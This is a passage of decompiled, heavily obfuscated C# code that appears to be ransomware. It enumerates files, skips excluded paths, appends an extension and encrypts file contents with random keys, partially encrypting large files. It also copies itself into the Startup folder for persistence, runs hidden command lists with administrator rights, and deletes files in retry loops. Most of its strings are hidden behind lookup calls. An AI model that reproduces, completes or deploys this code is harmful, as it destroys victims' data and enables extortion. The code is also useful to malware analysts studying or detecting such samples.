			if (!CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107352003)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351978)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351945)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351960)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351403)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351410)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351389)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351344)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351331)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351326)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351317)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351268)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351242)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351253)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351228)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351179)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351194)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351657)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351672)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351623)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351638)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351589)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351608)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351555)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351574)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351529)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351544)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().Contains(getString_0(107351495)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(gUlAYNDfQee(getString_0(107351510))) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351485)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107397151)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107351440)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(QxykwlAceQFylEg) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(getString_0(107351447)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(getString_0(107351442)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(getString_0(107350893)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(getString_0(107350888)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(getString_0(107350883)) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(tBpNkaUiwdaB) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(kZGwVMpcMFQGdu) && !CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.Contains(BVDNRoTnEzf))
			{
				if (boaEQxNXtIuKCtPO.Length != 0)
				{
					string[] array = boaEQxNXtIuKCtPO;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1094;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.EndsWith(QxykwlAceQFylEg))
					{
						goto IL_1094;
					}
				}
				catch (Exception)
				{
					goto IL_1094;
				}
				if (!aAbwlpshQJNC.Contains(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn))
				{
					if (kdgdQzLhNzqB == getString_0(107396901))
					{
						try
						{
							if (mnpRWvvbrJgHv.cJzqbOCqGLtS(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn))
							{
								mnpRWvvbrJgHv.WtlWQnLheONJif(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
							}
						}
						catch
						{
						}
					}
					aAbwlpshQJNC.Add(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (sHBjpbgVmkra)
							{
								Console.WriteLine(yNAeEToLAJLz.getString_0(107365802) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + yNAeEToLAJLz.getString_0(107365699) + new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length + yNAeEToLAJLz.getString_0(107365646));
								Console.WriteLine(yNAeEToLAJLz.getString_0(107365233), aAbwlpshQJNC.Count, iRDeCsZxbW, YZVmksVDGrCDMh);
								Console.WriteLine(yNAeEToLAJLz.getString_0(107365176), zTfquIuAKrE.Elapsed);
								Console.WriteLine(yNAeEToLAJLz.getString_0(107365669));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!AknjtLUSQgBf.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn)))
					{
						AknjtLUSQgBf.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn));
					}
					bHpvAtayIadi(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
					try
					{
						new OAxPYfdUYtB().kBVxeUnZtOC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (sHBjpbgVmkra)
								{
									Console.WriteLine(getString_0(107365702) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107365689) + new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length + getString_0(107365636));
									Console.WriteLine(getString_0(107365659));
								}
							}
							catch
							{
							}
							pPOxzMkmHSA(gUlAYNDfQee(getString_0(107365554)), getString_0(107350799) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107350799) + gUlAYNDfQee(getString_0(107365529)) + getString_0(107350799) + Environment.UserName + getString_0(107350799) + gUlAYNDfQee(getString_0(107365992)));
						}
					}
					catch (Exception ex2)
					{
						if (IOdNTzsqoZWVAC)
						{
							try
							{
								File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107365967) + ex2.Message + getString_0(107396673));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (IOdNTzsqoZWVAC)
							{
								try
								{
									File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107365918) + ex4.Message + getString_0(107396673));
								}
								catch (Exception)
								{
								}
							}
							YZVmksVDGrCDMh++;
							goto end_IL_0887_2;
						}
						if (dHRyeOBeWtyqJR == getString_0(107396901) && new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length > Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024)
						{
							try
							{
								if (QxykwlAceQFylEg != getString_0(107349478))
								{
									if (gmYGIhcbzDElW)
									{
										QxykwlAceQFylEg = lEGlvoOLHlud + QxykwlAceQFylEg;
									}
									File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg);
								}
							}
							catch (Exception ex6)
							{
								if (IOdNTzsqoZWVAC)
								{
									try
									{
										File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107365825) + ex6.Message + getString_0(107396673));
									}
									catch (Exception)
									{
									}
								}
								YZVmksVDGrCDMh++;
								return;
							}
							if (QxykwlAceQFylEg != getString_0(107349478))
							{
								CS_0024_003C_003E8__locals0.DTaZlHbaazgUn += QxykwlAceQFylEg;
							}
							if (ttlCPfUMAnPPn == getString_0(107396901))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in RpGcCAInLIz)
									{
										if (CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.aXSAfIkYbfct.QxykwlAceQFylEg) && ymVKGiHEgE == yNAeEToLAJLz.getString_0(107396911))
										{
											if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn).Length)
											{
												try
												{
													mYaTrXhnsaDz.jPGIJOflxVN(yNAeEToLAJLz.getString_0(107352670), yNAeEToLAJLz.getString_0(107352633), yNAeEToLAJLz.getString_0(107352620), CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.DTaZlHbaazgUn.ToLower().EndsWith(item) && ymVKGiHEgE == yNAeEToLAJLz.getString_0(107397021))
										{
											try
											{
												mYaTrXhnsaDz.jPGIJOflxVN(yNAeEToLAJLz.getString_0(107352670), yNAeEToLAJLz.getString_0(107352633), yNAeEToLAJLz.getString_0(107352620), CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = lOiJKLXYNaE.EUcJjWziQBK(32);
							string text2 = getString_0(107352547);
							text2 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : getString_0(107352547));
							string s = jHvXcQAocngrZWa.UXBKErjXJpX(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (fRCrnusObo == getString_0(107397011))
							{
								byte[] array2 = null;
								byte[] byte_ = kkKbYndBNVRIq.IVisBGGKLwj(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024);
								if (!kkKbYndBNVRIq.cOUmRprntfS(fWbWouVUtQb: (!ZdrpEPuTKVdNM) ? (JsBIHINLdKrOq ? kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(MKXSGZQsex), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JsBIHINLdKrOq ? ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_, Convert.FromBase64String(MKXSGZQsex), Convert.FromBase64String(tHaxFjXwOLKb))), mMkGcFwOyALFJP: CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, wNHkPJFScGyAC: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!JsBIHINLdKrOq)
							{
								if (!EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, XaBojWlRQDbFIzp, MKXSGZQsex, null, Convert.FromBase64String(tHaxFjXwOLKb)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, XaBojWlRQDbFIzp, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (gmYGIhcbzDElW)
							{
								QxykwlAceQFylEg = lEGlvoOLHlud + QxykwlAceQFylEg;
							}
							string text3 = lOiJKLXYNaE.EUcJjWziQBK(32);
							string text4 = getString_0(107352547);
							text4 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : getString_0(107352547));
							string s2 = jHvXcQAocngrZWa.UXBKErjXJpX(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (QxykwlAceQFylEg != getString_0(107349478))
							{
								if (!XRrWKEvMyEJKuU)
								{
									if (!JsBIHINLdKrOq)
									{
										rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, LkftepqeXsefTk);
									}
									else
									{
										rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!JsBIHINLdKrOq)
										{
											GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
										}
										else
										{
											GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (IOdNTzsqoZWVAC)
										{
											try
											{
												File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107349496) + ex11.Message + getString_0(107396673));
											}
											catch (Exception)
											{
											}
										}
										YZVmksVDGrCDMh++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!XRrWKEvMyEJKuU)
							{
								if (!JsBIHINLdKrOq)
								{
									rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107349473), LkftepqeXsefTk);
								}
								else
								{
									rVYEpwebTUtQK(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107349473), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!JsBIHINLdKrOq)
									{
										GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
									}
									else
									{
										GiEPJrlkxkyBC(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (IOdNTzsqoZWVAC)
									{
										try
										{
											File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349240) + CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + getString_0(107349496) + ex14.Message + getString_0(107396673));
										}
										catch (Exception)
										{
										}
									}
									YZVmksVDGrCDMh++;
									return;
								}
							}
							if (JsBIHINLdKrOq)
							{
								if (QxykwlAceQFylEg != getString_0(107349478))
								{
									LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn + QxykwlAceQFylEg, bytes2);
								}
								else
								{
									LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1094;
			IL_1094:
			irMLgePJDX.Remove(CS_0024_003C_003E8__locals0.DTaZlHbaazgUn);
		}

		static rMKsTJZgha()
		{
			Strings.CreateGetStringDelegate(typeof(rMKsTJZgha));
		}
	}

	private sealed class oFrPqQzOlPWjPPJE
	{
		public string GfqifsEJMyhuJ;

		public string AJFITcSiTZAbRQ;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(GfqifsEJMyhuJ);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(AJFITcSiTZAbRQ))
					{
						File.Delete(AJFITcSiTZAbRQ);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string nokUTrFAeAqS;

	public static byte[] LkftepqeXsefTk;

	public static string pmiCMuEhoSVg;

	public static string ejjizMMXKahuYA;

	public static List<string> nVFBdVszaoh;

	public static List<string> tRcxqKXXFdhA;

	public static string DxWSISSsaXgfVX;

	public static string MKXSGZQsex;

	public static string tHaxFjXwOLKb;

	public static string GwZQDnKvCkbY;

	public static string xWXZxqVDUFKioc;

	public static int JULoQsggNiDnUR;

	public static string kdgdQzLhNzqB;

	public static string FAsVLZJLwXqS;

	public static string OptwdYTAnBR;

	public static string WMeQgmnXwMnnp;

	public static string EFDzxcmIwSPdRR;

	public static string lRoMGetIZKVkNBK;

	public static string BxRuGJkuthedX;

	public static string ZqOTHnGaoa;

	public static List<string> LZEuriDHhOTXQVP;

	public static List<string> AknjtLUSQgBf;

	public static string iWREKodOegThnb;

	public static string gVnLtaDZItCBbZF;

	public static string KHgdqpecQduH;

	public static List<string> aAbwlpshQJNC;

	public static string zQwlajdXxSCLvhR;

	private static string wvzLXcmZQRs;

	public static string pPfoNHLnIlcgVkwJ;

	public static string XMCCbaSmvwzOjP;

	public static List<string> lMbEJNttORDtaQa;

	public static List<string> XlnNeRavcDb;

	public static List<string> IXWngnYZLBX;

	public static List<string> XFtbJYlwhqpqENB;

	public static string kDnHVAhwwgVXoVW;

	public static List<string> GisTIabtKerKbVFpC;

	public static List<string> kDCfoKkwytynODJ;

	public static string iRWAmeBuFS;

	public static string JHAiAJcdjwlA;

	internal static DateTime QWMtBnXiXkJVKfO;

	internal static DateTime eeFocYlMIKJKN;

	public static string dHRyeOBeWtyqJR;

	public static string XaBojWlRQDbFIzp;

	public static string lDHLHhajCIBI;

	public static string hZEvgRGQXZulHtgE;

	public static string RpTfbzuPUZrDEtZ;

	public static string UtfPPgIRjxFhud;

	public static string oMvdVJSuGVViJN;

	public static string ttlCPfUMAnPPn;

	public static List<string> RpGcCAInLIz;

	public static string ymVKGiHEgE;

	public static string MJsJJqYMMt;

	public static string VmPjzKeerW;

	public static string NipEhbZTuUcU;

	public static string RBVRJmVowxr;

	public static string bBXDBRmEBV;

	public static string ypnzdhChTR;

	public static string EzPmbiVliDos;

	public static string RdllPUiYOfhoadA;

	public static string uOwjgyGBImCyTh;

	public static string MhSAPUAlDsvP;

	public static string CMQNogJdWToMDT;

	public static string mKOkDQaPljqI;

	public static string YpMnpCDdWH;

	public static string BhxfVFAubm;

	public static string wGYtnKpqYFHr;

	public static string wurhcHMiwnSc;

	public static string LDMHMPhyNAzJeGdm;

	public static string QZfoZaarzGXdusa;

	public static string tBpNkaUiwdaB;

	public static string NvaHMnBuwoxAC;

	public static string BHeoAszMQT;

	public static string ypGsJRXNFvPKhg;

	public static string aknerzLuiE;

	public static string DouUqolyZMEp;

	public static string KSiSWyHpfguf;

	public static string fRCrnusObo;

	public static string tHgXSgSddc;

	public static string keeYOyzqUcgVaN;

	public static string[] aFNqMcwAAAxMXR;

	public static string jdWvevqcLSOo;

	public static bool ZdrpEPuTKVdNM;

	public static string KExMLRsuNJD;

	public static bool JsBIHINLdKrOq;

	public static bool MoHVBVpEVCn;

	public static bool RXXawWHSUduuQmi;

	public static bool nvDjaPaRiDuaffz;

	public static string kZGwVMpcMFQGdu;

	public static bool IOdNTzsqoZWVAC;

	public static bool KfALXtYosUA;

	public static bool dDQbvgPvmJtcLs;

	public static bool hkbsCfPIIfG;

	public static bool XRrWKEvMyEJKuU;

	public static string BVDNRoTnEzf;

	public static bool sHBjpbgVmkra;

	public static Stopwatch zTfquIuAKrE;

	public static int YZVmksVDGrCDMh;

	public static int iRDeCsZxbW;

	public static bool gmYGIhcbzDElW;

	public static string lEGlvoOLHlud;

	public static string[] GQkmlevykTr;

	public static List<string> PRoLdgGnxEJpc;

	public static int HIQVHDMwUWaV;

	public static bool WUcQpnUgejkJqpB;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			LvzpHEuYptQYCE CS_0024_003C_003E8__locals0 = new LvzpHEuYptQYCE();
			CS_0024_003C_003E8__locals0.FCqnQUJrOVeL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.FCqnQUJrOVeL) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			LAVJQFVjIeIWMX.JijrRQeRNRqt(wvzLXcmZQRs);
		}
		catch (Exception)
		{
		}
		try
		{
			if (KSiSWyHpfguf == getString_0(107396883))
			{
				Thread thread = new Thread(yOQIUqMsOBsM.wIwRDhfGDNvHMED);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (OptwdYTAnBR == getString_0(107396883))
		{
			Thread.Sleep(int.Parse(WMeQgmnXwMnnp));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && oMvdVJSuGVViJN == getString_0(107396883))
		{
			try
			{
				rDDvZMWRMJDk(gUlAYNDfQee(getString_0(107396910)));
			}
			catch
			{
			}
		}
		try
		{
			if (BxRuGJkuthedX == getString_0(107396883) && tkXmZtVFdIlZ.ORBNmJXYnEEna())
			{
				new mxkHmTSiPMyQJW().hhmmhSjhgLg(bool_0: false);
				tkXmZtVFdIlZ.YslilsJPBpZcDl();
			}
		}
		catch (Exception)
		{
		}
		if (gVnLtaDZItCBbZF == getString_0(107396883) && tkXmZtVFdIlZ.ORBNmJXYnEEna())
		{
			new mxkHmTSiPMyQJW().hhmmhSjhgLg(bool_0: false);
			new mxkHmTSiPMyQJW().QSgzXGMuHCEjXx();
		}
		if (FAsVLZJLwXqS == getString_0(107396883))
		{
			pvOMXjQbctYsQ.twEVoCZtELY();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396805);
			string text2 = text + Path.GetFileName(fileName);
			if (xWXZxqVDUFKioc == getString_0(107396883) && fileName != text2)
			{
				Thread thread2 = new Thread(DYgvMzbGMhCFj);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (DxWSISSsaXgfVX == getString_0(107396883) && mainModule != null && fileName != text2)
			{
				try
				{
					JULoQsggNiDnUR = skofznEiFeFXQRJ(0, LZEuriDHhOTXQVP.Count);
					File.Copy(fileName, text + LZEuriDHhOTXQVP[JULoQsggNiDnUR], overwrite: true);
					Process.Start(text + LZEuriDHhOTXQVP[JULoQsggNiDnUR]);
					cBtlovdwPrJ();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (iRWAmeBuFS == getString_0(107396883) && DateTime.Now < QWMtBnXiXkJVKfO)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (JHAiAJcdjwlA == getString_0(107396883) && DateTime.Now > eeFocYlMIKJKN)
			{
				cBtlovdwPrJ();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107396800);
			if (mKOkDQaPljqI == getString_0(107396883))
			{
				Console.WriteLine(getString_0(107397142));
			}
			zTfquIuAKrE.Start();
		}
		catch
		{
		}
		VmGKQPbCus();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> xlnNeRavcDb = XlnNeRavcDb;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						pPOxzMkmHSA(gUlAYNDfQee(getString_0(107349393)), string_0);
					};
				}
				Parallel.ForEach(xlnNeRavcDb, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> iXWngnYZLBX = IXWngnYZLBX;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						pPOxzMkmHSA(gUlAYNDfQee(getString_0(107349412)), string_0);
					};
				}
				Parallel.ForEach(iXWngnYZLBX, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (keeYOyzqUcgVaN == getString_0(107396883))
				{
					string[] source = aFNqMcwAAAxMXR;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							pPOxzMkmHSA(gUlAYNDfQee(getString_0(107349412)), getString_0(107349387) + string_0 + getString_0(107349378));
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!eXbSvlDLJLqL().Contains(getString_0(107349600)))
				{
					RAlhSUgGUPFPfl(kDnHVAhwwgVXoVW);
				}
				else
				{
					List<string> xFtbJYlwhqpqENB = XFtbJYlwhqpqENB;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							pPOxzMkmHSA(gUlAYNDfQee(iJCgrnXGsBtuIOeX(getString_0(107348829))), string_0);
						};
					}
					Parallel.ForEach(xFtbJYlwhqpqENB, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> gisTIabtKerKbVFpC = GisTIabtKerKbVFpC;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						pPOxzMkmHSA(gUlAYNDfQee(getString_0(107348836)), string_0);
					};
				}
				Parallel.ForEach(gisTIabtKerKbVFpC, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397133))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397133)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397084)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !nVFBdVszaoh.Contains(text6) && text6 != getString_0(107397095) && text6 != getString_0(107397042) && text6 != getString_0(107397021))
								{
									nVFBdVszaoh.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397024)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
